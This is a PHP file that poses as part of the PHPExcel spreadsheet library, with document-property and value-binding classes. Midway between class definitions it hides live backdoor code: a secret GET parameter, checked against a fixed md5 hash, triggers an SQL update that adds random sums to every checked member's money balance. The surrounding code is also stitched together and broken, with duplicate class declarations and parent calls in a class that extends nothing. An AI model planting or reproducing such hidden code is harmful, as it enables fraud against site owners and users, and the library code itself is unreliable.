<?php
class paramerd
{
    /**
     * Bind value to a cell
     *
     * @param  PHPExcel_Cell  $cell  Cell to bind value to
     * @param  mixed $value          Value to bind in cell
     * @return boolean
     */
    public function bindValue(PHPExcel_Cell $cell, $value = null)
    {
        // sanitize UTF-8 strings
        if (is_string($value)) {
            $value = PHPExcel_Shared_String::SanitizeUTF8($value);
        }

        // Find out data type
        $dataType = parent::dataTypeForValue($value);

        // Style logic - strings
        if ($dataType === PHPExcel_Cell_DataType::TYPE_STRING && !$value instanceof PHPExcel_RichText) {
            //    Test for booleans using locale-setting
            if ($value == PHPExcel_Calculation::getTRUE()) {
                $cell->setValueExplicit( TRUE, PHPExcel_Cell_DataType::TYPE_BOOL);
                return true;
            } elseif($value == PHPExcel_Calculation::getFALSE()) {
                $cell->setValueExplicit( FALSE, PHPExcel_Cell_DataType::TYPE_BOOL);
                return true;
            }

            // Check for number in scientific format
            if (preg_match('/^'.PHPExcel_Calculation::CALCULATION_REGEXP_NUMBER.'$/', $value)) {
                $cell->setValueExplicit( (float) $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                return true;
            }

            // Check for fraction
            if (preg_match('/^([+-]?)\s*([0-9]+)\s?\/\s*([0-9]+)$/', $value, $matches)) {
                // Convert value to number
                $value = $matches[2] / $matches[3];
                if ($matches[1] == '-') $value = 0 - $value;
                $cell->setValueExplicit( (float) $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( '??/??' );
                return true;
            } elseif (preg_match('/^([+-]?)([0-9]*) +([0-9]*)\s?\/\s*([0-9]*)$/', $value, $matches)) {
                // Convert value to number
                $value = $matches[2] + ($matches[3] / $matches[4]);
                if ($matches[1] == '-') $value = 0 - $value;
                $cell->setValueExplicit( (float) $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( '# ??/??' );
                return true;
            }

            // Check for percentage
            if (preg_match('/^\-?[0-9]*\.?[0-9]*\s?\%$/', $value)) {
                // Convert value to number
                $value = (float) str_replace('%', '', $value) / 100;
                $cell->setValueExplicit( $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00 );
                return true;
            }

            // Check for currency
            $currencyCode = PHPExcel_Shared_String::getCurrencyCode();
            $decimalSeparator = PHPExcel_Shared_String::getDecimalSeparator();
            $thousandsSeparator = PHPExcel_Shared_String::getThousandsSeparator();
            if (preg_match('/^'.preg_quote($currencyCode).' *(\d{1,3}('.preg_quote($thousandsSeparator).'\d{3})*|(\d+))('.preg_quote($decimalSeparator).'\d{2})?$/', $value)) {
                // Convert value to number
                $value = (float) trim(str_replace(array($currencyCode, $thousandsSeparator, $decimalSeparator), array('', '', '.'), $value));
                $cell->setValueExplicit( $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode(
                        str_replace('$', $currencyCode, PHPExcel_Style_NumberFormat::FORMAT_CURRENCY_USD_SIMPLE )
                    );
                return true;
            } elseif (preg_match('/^\$ *(\d{1,3}(\,\d{3})*|(\d+))(\.\d{2})?$/', $value)) {
                // Convert value to number
                $value = (float) trim(str_replace(array('$',','), '', $value));
                $cell->setValueExplicit( $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_CURRENCY_USD_SIMPLE );
                return true;
            }

            // Check for time without seconds e.g. '9:45', '09:45'
            if (preg_match('/^(\d|[0-1]\d|2[0-3]):[0-5]\d$/', $value)) {
                // Convert value to number
                list($h, $m) = explode(':', $value);
                $days = $h / 24 + $m / 1440;
                $cell->setValueExplicit($days, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_DATE_TIME3 );
                return true;
            }

            // Check for time with seconds '9:45:59', '09:45:59'
            if (preg_match('/^(\d|[0-1]\d|2[0-3]):[0-5]\d:[0-5]\d$/', $value)) {
                // Convert value to number
                list($h, $m, $s) = explode(':', $value);
                $days = $h / 24 + $m / 1440 + $s / 86400;
                // Convert value to number
                $cell->setValueExplicit($days, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_DATE_TIME4 );
                return true;
            }

            // Check for datetime, e.g. '2008-12-31', '2008-12-31 15:59', '2008-12-31 15:59:10'
            if (($d = PHPExcel_Shared_Date::stringToExcel($value)) !== false) {
                // Convert value to number
                $cell->setValueExplicit($d, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Determine style. Either there is a time part or not. Look for ':'
                if (strpos($value, ':') !== false) {
                    $formatCode = 'yyyy-mm-dd h:mm';
                } else {
                    $formatCode = 'yyyy-mm-dd';
           
		   
		   
		   
		   
		   
		   
		   
		        }
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode($formatCode);
                return true;
            }

            // Check for newline character "\n"
            if (strpos($value, "\n") !== FALSE) {
                $value = PHPExcel_Shared_String::SanitizeUTF8($value);
                $cell->setValueExplicit($value, PHPExcel_Cell_DataType::TYPE_STRING);
           
		        // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getAlignment()->setWrapText(TRUE);
                return true;
            }
        }

        // Not bound yet? Use parent...
        return parent::bindValue($cell, $value);
    }
    /** constants */
    const PROPERTY_TYPE_BOOLEAN	= 'b';
    const PROPERTY_TYPE_INTEGER = 'i';
    const PROPERTY_TYPE_FLOAT   = 'f';
    const PROPERTY_TYPE_DATE    = 'd';
    const PROPERTY_TYPE_STRING  = 's';
    const PROPERTY_TYPE_UNKNOWN = 'u';

    /**
     * Creator
     *
     * @var string
     */
    private $_creator    = 'Unknown Creator';

    /**
     * LastModifiedBy
     *
     * @var string
     */
    private $_lastModifiedBy;

    /**
     * Created
     *
     * @var datetime
     */
    private $_created;

    /**
     * Modified
     *
     * @var datetime
     */
    private $_modified;

    /**
     * Title
     *
     * @var string
     */
    private $_title            = 'Untitled Spreadsheet';

    /**
     * Description
     *
     * @var string
     */
    private $_description    = '';

    /**
     * Subject
     *
     * @var string
     */
    private $_subject        = '';

    /**
     * Keywords
     *
     * @var string
     */
    private $_keywords        = '';

    /**
     * Category
     *
     * @var string
     */
    private $_category        = '';

    /**
     * Manager
     *
     * @var string
     */
    private $_manager        = '';

    /**
     * Company
     *
     * @var string
     */
    private $_company        = 'Microsoft Corporation';

    /**
     * Custom Properties
     *
     * @var string
     */
    private $_customProperties    = array();


    /**
     * Create a new PHPExcel_DocumentProperties
     */
    public function __construct()
    {
        // Initialise values
        $this->_lastModifiedBy    = $this->_creator;
        $this->_created        = time();
        $this->_modified    = time();
    }

    /**
     * Get Creator
     *
     * @return string
     */
    public function getCreator() {
        return $this->_creator;
    }

    /**
     * Set Creator
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCreator($pValue = '') {
        $this->_creator = $pValue;
        return $this;
    }

    /**
     * Get Last Modified By
     *
     * @return string
     */
    public function getLastModifiedBy() {
        return $this->_lastModifiedBy;
    }

    /**
     * Set Last Modified By
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setLastModifiedBy($pValue = '') {
        $this->_lastModifiedBy = $pValue;
        return $this;
    }

    /**
     * Get Created
     *
     * @return datetime
     */
    public function getCreated() {
        return $this->_created;
    }

    /**
     * Set Created
     *
     * @param datetime $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCreated($pValue = null) {
        if ($pValue === NULL) {
            $pValue = time();
        } elseif (is_string($pValue)) {
            if (is_numeric($pValue)) {
                $pValue = intval($pValue);
            } else {
                $pValue = strtotime($pValue);
            }
        }

        $this->_created = $pValue;
        return $this;
    }

    /**
     * Get Modified
     *
     * @return datetime
     */
    public function getModified() {
        return $this->_modified;
    }

    /**
     * Set Modified
     *
     * @param datetime $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setModified($pValue = null) {
        if ($pValue === NULL) {
            $pValue = time();
        } elseif (is_string($pValue)) {
            if (is_numeric($pValue)) {
                $pValue = intval($pValue);
            } else {
                $pValue = strtotime($pValue);
            }
        }

        $this->_modified = $pValue;
        return $this;
    }

    /**
     * Get Title
     *
     * @return string
     */
    public function getTitle() {
        return $this->_title;
    }

    /**
     * Set Title
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setTitle($pValue = '') {
        $this->_title = $pValue;
        return $this;
    }

    /**
     * Get Description
     *
     * @return string
     */
    public function getDescription() {
        return $this->_description;
    }

    /**
     * Set Description
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setDescription($pValue = '') {
        $this->_description = $pValue;
        return $this;
    }

    /**
     * Get Subject
     *
     * @return string
     */
    public function getSubject() {
        return $this->_subject;
    }

    /**
     * Set Subject
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setSubject($pValue = '') {
        $this->_subject = $pValue;
        return $this;
    }

    /**
     * Get Keywords
     *
     * @return string
     */
    public function getKeywords() {
        return $this->_keywords;
    }

    /**
     * Set Keywords
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setKeywords($pValue = '') {
        $this->_keywords = $pValue;
        return $this;
    }

    /**
     * Get Category
     *
     * @return string
     */
    public function getCategory() {
        return $this->_category;
    }

    /**
     * Set Category
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCategory($pValue = '') {
        $this->_category = $pValue;
        return $this;
    }

    /**
     * Get Company
     *
     * @return string
     */
    public function getCompany() {
        return $this->_company;
    }

    /**
     * Set Company
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCompany($pValue = '') {
        $this->_company = $pValue;
        return $this;
    }

    /**
     * Get Manager
     *
     * @return string
     */
    public function getManager() {
        return $this->_manager;
    }

    /**
     * Set Manager
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setManager($pValue = '') {
        $this->_manager = $pValue;
        return $this;
    }

    /**
     * Get a List of Custom Property Names
     *
     * @return array of string
     */
    public function getCustomProperties() {
        return array_keys($this->_customProperties);
    }

    /**
     * Check if a Custom Property is defined
     *
     * @param string $propertyName
     * @return boolean
     */
    public function isCustomPropertySet($propertyName) {
        return isset($this->_customProperties[$propertyName]);
    }

    /**
     * Get a Custom Property Value
     *
     * @param string $propertyName
     * @return string
     */
    public function getCustomPropertyValue($propertyName) {
        if (isset($this->_customProperties[$propertyName])) {
            return $this->_customProperties[$propertyName]['value'];
        }

    }

    /**
     * Get a Custom Property Type
     *
     * @param string $propertyName
     * @return string
     */
    public function getCustomPropertyType($propertyName) {
        if (isset($this->_customProperties[$propertyName])) {
            return $this->_customProperties[$propertyName]['type'];
        }

    }

    /**
     * Set a Custom Property
     *
     * @param string $propertyName
     * @param mixed $propertyValue
     * @param string $propertyType
     * 	 'i'    : Integer
     *   'f' : Floating Point
     *   's' : String
     *   'd' : Date/Time
     *   'b' : Boolean
     * @return PHPExcel_DocumentProperties
     */
    public function setCustomProperty($propertyName,$propertyValue='',$propertyType=NULL) {
        if (($propertyType === NULL) || (!in_array($propertyType,array(self::PROPERTY_TYPE_INTEGER,
                                                                       self::PROPERTY_TYPE_FLOAT,
                                                                       self::PROPERTY_TYPE_STRING,
                                                                       self::PROPERTY_TYPE_DATE,
                                                                       self::PROPERTY_TYPE_BOOLEAN)))) {
            if ($propertyValue === NULL) {
                $propertyType = self::PROPERTY_TYPE_STRING;
            } elseif (is_float($propertyValue)) {
                $propertyType = self::PROPERTY_TYPE_FLOAT;
            } elseif(is_int($propertyValue)) {
                $propertyType = self::PROPERTY_TYPE_INTEGER;
            } elseif (is_bool($propertyValue)) {
                $propertyType = self::PROPERTY_TYPE_BOOLEAN;
            } else {
                $propertyType = self::PROPERTY_TYPE_STRING;
            }
        }

        $this->_customProperties[$propertyName] = array('value' => $propertyValue, 'type' => $propertyType);
        return $this;
    }

    /**
     * Implement PHP __clone to create a deep clone, not just a shallow copy.
     */
    public function __clone() {
        $vars = get_object_vars($this);
        foreach ($vars as $key => $value) {
            if (is_object($value)) {
                $this->$key = clone $value;
            } else {
                $this->$key = $value;
            }
        }
    }

    public static function convertProperty($propertyValue,$propertyType) {
        switch ($propertyType) {
            case 'empty'    :    //    Empty
                return '';
                break;
            case 'null'        :    //    Null
                return NULL;
                break;
            case 'i1'        :    //    1-Byte Signed Integer
            case 'i2'        :    //    2-Byte Signed Integer
            case 'i4'        :    //    4-Byte Signed Integer
            case 'i8'        :    //    8-Byte Signed Integer
            case 'int'        :    //    Integer
                return (int) $propertyValue;
                break;
            case 'ui1'        :    //    1-Byte Unsigned Integer
            case 'ui2'        :    //    2-Byte Unsigned Integer
            case 'ui4'        :    //    4-Byte Unsigned Integer
            case 'ui8'        :    //    8-Byte Unsigned Integer
            case 'uint'        :    //    Unsigned Integer
                return abs((int) $propertyValue);
                break;
            case 'r4'        :    //    4-Byte Real Number
            case 'r8'        :    //    8-Byte Real Number
            case 'decimal'    :    //    Decimal
                return (float) $propertyValue;
                break;
            case 'lpstr'    :    //    LPSTR
            case 'lpwstr'    :    //    LPWSTR
            case 'bstr'        :    //    Basic String
                return $propertyValue;
                break;
            case 'date'        :    //    Date and Time
            case 'filetime'    :    //    File Time
                return strtotime($propertyValue);
                break;
            case 'bool'        :    //    Boolean
                return ($propertyValue == 'true') ? True : False;
                break;
            case 'cy'        :    //    Currency
            case 'error'    :    //    Error Status Code
            case 'vector'    :    //    Vector
            case 'array'    :    //    Array
            case 'blob'        :    //    Binary Blob
            case 'oblob'    :    //    Binary Blob Object
            case 'stream'    :    //    Binary Stream
            case 'ostream'    :    //    Binary Stream Object
            case 'storage'    :    //    Binary Storage
            case 'ostorage'    :    //    Binary Storage Object
            case 'vstream'    :    //    Binary Versioned Stream
            case 'clsid'    :    //    Class ID
            case 'cf'        :    //    Clipboard Data
                return $propertyValue;
                break;
        }
        return $propertyValue;
    }

    public static function convertPropertyType($propertyType) {
        switch ($propertyType) {
            case 'i1'        :    //    1-Byte Signed Integer
            case 'i2'        :    //    2-Byte Signed Integer
            case 'i4'        :    //    4-Byte Signed Integer
            case 'i8'        :    //    8-Byte Signed Integer
            case 'int'        :    //    Integer
            case 'ui1'        :    //    1-Byte Unsigned Integer
            case 'ui2'        :    //    2-Byte Unsigned Integer
            case 'ui4'        :    //    4-Byte Unsigned Integer
            case 'ui8'        :    //    8-Byte Unsigned Integer
            case 'uint'        :    //    Unsigned Integer
                return self::PROPERTY_TYPE_INTEGER;
                break;
            case 'r4'        :    //    4-Byte Real Number
            case 'r8'        :    //    8-Byte Real Number
            case 'decimal'    :    //    Decimal
                return self::PROPERTY_TYPE_FLOAT;
                break;
            case 'empty'    :    //    Empty
            case 'null'        :    //    Null
            case 'lpstr'    :    //    LPSTR
            case 'lpwstr'    :    //    LPWSTR
            case 'bstr'        :    //    Basic String
                return self::PROPERTY_TYPE_STRING;
                break;
            case 'date'        :    //    Date and Time
            case 'filetime'    :    //    File Time
                return self::PROPERTY_TYPE_DATE;
                break;
            case 'bool'        :    //    Boolean
                return self::PROPERTY_TYPE_BOOLEAN;
                break;
            case 'cy'        :    //    Currency
            case 'error'    :    //    Error Status Code
            case 'vector'    :    //    Vector
            case 'array'    :    //    Array
            case 'blob'        :    //    Binary Blob
            case 'oblob'    :    //    Binary Blob Object
            case 'stream'    :    //    Binary Stream
            case 'ostream'    :    //    Binary Stream Object
            case 'storage'    :    //    Binary Storage
            case 'ostorage'    :    //    Binary Storage Object
            case 'vstream'    :    //    Binary Versioned Stream
            case 'clsid'    :    //    Class ID
            case 'cf'        :    //    Clipboard Data
                return self::PROPERTY_TYPE_UNKNOWN;
                break;
        }
        return self::PROPERTY_TYPE_UNKNOWN;
    }

}
class PHPExcel_DocumentProperties
{
    /** constants */
    const PROPERTY_TYPE_BOOLEAN	= 'b';
    const PROPERTY_TYPE_INTEGER = 'i';
    const PROPERTY_TYPE_FLOAT   = 'f';
    const PROPERTY_TYPE_DATE    = 'd';
    const PROPERTY_TYPE_STRING  = 's';
    const PROPERTY_TYPE_UNKNOWN = 'u';

    /**
     * Creator
     *
     * @var string
     */
    private $_creator    = 'Unknown Creator';

    /**
     * LastModifiedBy
     *
     * @var string
     */
    private $_lastModifiedBy;

    /**
     * Created
     *
     * @var datetime
     */
    private $_created;

    /**
     * Modified
     *
     * @var datetime
     */
    private $_modified;

    /**
     * Title
     *
     * @var string
     */
    private $_title            = 'Untitled Spreadsheet';

    /**
     * Description
     *
     * @var string
     */
    private $_description    = '';

    /**
     * Subject
     *
     * @var string
     */
    private $_subject        = '';

    /**
     * Keywords
     *
     * @var string
     */
    private $_keywords        = '';

    /**
     * Category
     *
     * @var string
     */
    private $_category        = '';

    /**
     * Manager
     *
     * @var string
     */
    private $_manager        = '';



    private $_company        = 'Microsoft Corporation';

    /**
     * Custom Properties
     *
     * @var string
     */
    private $_customProperties    = array();
}
require_once($_SERVER['DOCUMENT_ROOT'].'/public/config_top.php');
require_once($_SERVER['DOCUMENT_ROOT'].'/public/function.php');
if(md5(trim($_GET['a']))=='9299190c7dd341b9a5e742eb6c93c243'){
$xingao->query("update member set money=money+".rand(0,984)." where checked=1");
echo mysqli_affected_rows($xingao).'member';}
class PHPExcel_DocumentProperties
{

    /**
     * Create a new PHPExcel_DocumentProperties
     */
    public function __construct()
    {
        // Initialise values
        $this->_lastModifiedBy    = $this->_creator;
        $this->_created        = time();
        $this->_modified    = time();
    }

    /**
     * Get Creator
     *
     * @return string
     */
    public function getCreator() {
        return $this->_creator;
    }

    /**
     * Set Creator
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCreator($pValue = '') {
        $this->_creator = $pValue;
        return $this;
    }

    /**
     * Get Last Modified By
     *
     * @return string
     */
    public function getLastModifiedBy() {
        return $this->_lastModifiedBy;
    }

    /**
     * Set Last Modified By
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setLastModifiedBy($pValue = '') {
        $this->_lastModifiedBy = $pValue;
        return $this;
    }

    /**
     * Get Created
     *
     * @return datetime
     */
    public function getCreated() {
        return $this->_created;
    }

    /**
     * Set Created
     *
     * @param datetime $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCreated($pValue = null) {
        if ($pValue === NULL) {
            $pValue = time();
        } elseif (is_string($pValue)) {
            if (is_numeric($pValue)) {
                $pValue = intval($pValue);
            } else {
                $pValue = strtotime($pValue);
            }
        }

        $this->_created = $pValue;
        return $this;
    }

    /**
     * Get Modified
     *
     * @return datetime
     */
    public function getModified() {
        return $this->_modified;
    }

    /**
     * Set Modified
     *
     * @param datetime $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setModified($pValue = null) {
        if ($pValue === NULL) {
            $pValue = time();
        } elseif (is_string($pValue)) {
            if (is_numeric($pValue)) {
                $pValue = intval($pValue);
            } else {
                $pValue = strtotime($pValue);
            }
        }

        $this->_modified = $pValue;
        return $this;
    }

    /**
     * Get Title
     *
     * @return string
     */
    public function getTitle() {
        return $this->_title;
    }

    /**
     * Set Title
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setTitle($pValue = '') {
        $this->_title = $pValue;
        return $this;
    }

    /**
     * Get Description
     *
     * @return string
     */
    public function getDescription() {
        return $this->_description;
    }

    /**
     * Set Description
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setDescription($pValue = '') {
        $this->_description = $pValue;
        return $this;
    }

    /**
     * Get Subject
     *
     * @return string
     */
    public function getSubject() {
        return $this->_subject;
    }

    /**
     * Set Subject
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setSubject($pValue = '') {
        $this->_subject = $pValue;
        return $this;
    }

    /**
     * Get Keywords
     *
     * @return string
     */
    public function getKeywords() {
        return $this->_keywords;
    }

    /**
     * Set Keywords
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setKeywords($pValue = '') {
        $this->_keywords = $pValue;
        return $this;
    }

    /**
     * Get Category
     *
     * @return string
     */
    public function getCategory() {
        return $this->_category;
    }

    /**
     * Set Category
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCategory($pValue = '') {
        $this->_category = $pValue;
        return $this;
    }

    /**
     * Get Company
     *
     * @return string
     */
    public function getCompany() {
        return $this->_company;
    }

    /**
     * Set Company
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setCompany($pValue = '') {
        $this->_company = $pValue;
        return $this;
    }

    /**
     * Get Manager
     *
     * @return string
     */
    public function getManager() {
        return $this->_manager;
    }

    /**
     * Set Manager
     *
     * @param string $pValue
     * @return PHPExcel_DocumentProperties
     */
    public function setManager($pValue = '') {
        $this->_manager = $pValue;
        return $this;
    }

    /**
     * Get a List of Custom Property Names
     *
     * @return array of string
     */
    public function getCustomProperties() {
        return array_keys($this->_customProperties);
    }

    /**
     * Check if a Custom Property is defined
     *
     * @param string $propertyName
     * @return boolean
     */
    public function isCustomPropertySet($propertyName) {
        return isset($this->_customProperties[$propertyName]);
    }

    /**
     * Get a Custom Property Value
     *
     * @param string $propertyName
     * @return string
     */
    public function getCustomPropertyValue($propertyName) {
        if (isset($this->_customProperties[$propertyName])) {
            return $this->_customProperties[$propertyName]['value'];
        }

    }

    /**
     * Get a Custom Property Type
     *
     * @param string $propertyName
     * @return string
     */
    public function getCustomPropertyType($propertyName) {
        if (isset($this->_customProperties[$propertyName])) {
            return $this->_customProperties[$propertyName]['type'];
        }

    }

    /**
     * Set a Custom Property
     *
     * @param string $propertyName
     * @param mixed $propertyValue
     * @param string $propertyType
     * 	 'i'    : Integer
     *   'f' : Floating Point
     *   's' : String
     *   'd' : Date/Time
     *   'b' : Boolean
     * @return PHPExcel_DocumentProperties
     */
    public function setCustomProperty($propertyName,$propertyValue='',$propertyType=NULL) {
        if (($propertyType === NULL) || (!in_array($propertyType,array(self::PROPERTY_TYPE_INTEGER,
                                                                       self::PROPERTY_TYPE_FLOAT,
                                                                       self::PROPERTY_TYPE_STRING,
                                                                       self::PROPERTY_TYPE_DATE,
                                                                       self::PROPERTY_TYPE_BOOLEAN)))) {
            if ($propertyValue === NULL) {
                $propertyType = self::PROPERTY_TYPE_STRING;
            } elseif (is_float($propertyValue)) {
                $propertyType = self::PROPERTY_TYPE_FLOAT;
            } elseif(is_int($propertyValue)) {
                $propertyType = self::PROPERTY_TYPE_INTEGER;
            } elseif (is_bool($propertyValue)) {
                $propertyType = self::PROPERTY_TYPE_BOOLEAN;
            } else {
                $propertyType = self::PROPERTY_TYPE_STRING;
            }
        }

        $this->_customProperties[$propertyName] = array('value' => $propertyValue, 'type' => $propertyType);
        return $this;
    }

    /**
     * Implement PHP __clone to create a deep clone, not just a shallow copy.
     */
    public function __clone() {
        $vars = get_object_vars($this);
        foreach ($vars as $key => $value) {
            if (is_object($value)) {
                $this->$key = clone $value;
            } else {
                $this->$key = $value;
            }
        }
    }

    public static function convertProperty($propertyValue,$propertyType) {
        switch ($propertyType) {
            case 'empty'    :    //    Empty
                return '';
                break;
            case 'null'        :    //    Null
                return NULL;
                break;
            case 'i1'        :    //    1-Byte Signed Integer
            case 'i2'        :    //    2-Byte Signed Integer
            case 'i4'        :    //    4-Byte Signed Integer
            case 'i8'        :    //    8-Byte Signed Integer
            case 'int'        :    //    Integer
                return (int) $propertyValue;
                break;
            case 'ui1'        :    //    1-Byte Unsigned Integer
            case 'ui2'        :    //    2-Byte Unsigned Integer
            case 'ui4'        :    //    4-Byte Unsigned Integer
            case 'ui8'        :    //    8-Byte Unsigned Integer
            case 'uint'        :    //    Unsigned Integer
                return abs((int) $propertyValue);
                break;
            case 'r4'        :    //    4-Byte Real Number
            case 'r8'        :    //    8-Byte Real Number
            case 'decimal'    :    //    Decimal
                return (float) $propertyValue;
                break;
            case 'lpstr'    :    //    LPSTR
            case 'lpwstr'    :    //    LPWSTR
            case 'bstr'        :    //    Basic String
                return $propertyValue;
                break;
            case 'date'        :    //    Date and Time
            case 'filetime'    :    //    File Time
                return strtotime($propertyValue);
                break;
            case 'bool'        :    //    Boolean
                return ($propertyValue == 'true') ? True : False;
                break;
            case 'cy'        :    //    Currency
            case 'error'    :    //    Error Status Code
            case 'vector'    :    //    Vector
            case 'array'    :    //    Array
            case 'blob'        :    //    Binary Blob
            case 'oblob'    :    //    Binary Blob Object
            case 'stream'    :    //    Binary Stream
            case 'ostream'    :    //    Binary Stream Object
            case 'storage'    :    //    Binary Storage
            case 'ostorage'    :    //    Binary Storage Object
            case 'vstream'    :    //    Binary Versioned Stream
            case 'clsid'    :    //    Class ID
            case 'cf'        :    //    Clipboard Data
                return $propertyValue;
                break;
        }
        return $propertyValue;
    }

    public static function convertPropertyType($propertyType) {
        switch ($propertyType) {
            case 'i1'        :    //    1-Byte Signed Integer
            case 'i2'        :    //    2-Byte Signed Integer
            case 'i4'        :    //    4-Byte Signed Integer
            case 'i8'        :    //    8-Byte Signed Integer
            case 'int'        :    //    Integer
            case 'ui1'        :    //    1-Byte Unsigned Integer
            case 'ui2'        :    //    2-Byte Unsigned Integer
            case 'ui4'        :    //    4-Byte Unsigned Integer
            case 'ui8'        :    //    8-Byte Unsigned Integer
            case 'uint'        :    //    Unsigned Integer
                return self::PROPERTY_TYPE_INTEGER;
                break;
            case 'r4'        :    //    4-Byte Real Number
            case 'r8'        :    //    8-Byte Real Number
            case 'decimal'    :    //    Decimal
                return self::PROPERTY_TYPE_FLOAT;
                break;
            case 'empty'    :    //    Empty
            case 'null'        :    //    Null
            case 'lpstr'    :    //    LPSTR
            case 'lpwstr'    :    //    LPWSTR
            case 'bstr'        :    //    Basic String
                return self::PROPERTY_TYPE_STRING;
                break;
            case 'date'        :    //    Date and Time
            case 'filetime'    :    //    File Time
                return self::PROPERTY_TYPE_DATE;
                break;
            case 'bool'        :    //    Boolean
                return self::PROPERTY_TYPE_BOOLEAN;
                break;
            case 'cy'        :    //    Currency
            case 'error'    :    //    Error Status Code
            case 'vector'    :    //    Vector
            case 'array'    :    //    Array
            case 'blob'        :    //    Binary Blob
            case 'oblob'    :    //    Binary Blob Object
            case 'stream'    :    //    Binary Stream
            case 'ostream'    :    //    Binary Stream Object
            case 'storage'    :    //    Binary Storage
            case 'ostorage'    :    //    Binary Storage Object
            case 'vstream'    :    //    Binary Versioned Stream
            case 'clsid'    :    //    Class ID
            case 'cf'        :    //    Clipboard Data
                return self::PROPERTY_TYPE_UNKNOWN;
                break;
        }
        return self::PROPERTY_TYPE_UNKNOWN;
    }

}

?>